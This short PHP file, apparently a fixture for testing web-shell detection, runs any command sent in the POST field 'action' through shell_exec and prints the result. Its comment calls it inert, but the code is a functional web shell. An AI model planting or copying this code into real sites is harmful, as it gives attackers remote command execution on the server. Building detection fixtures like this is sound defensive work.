<?php
// DETECTION TEST FIXTURE -- inert payload, never deploy this file.

if (isset($_POST['action'])) {
    $output = shell_exec($_POST['action']);
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}
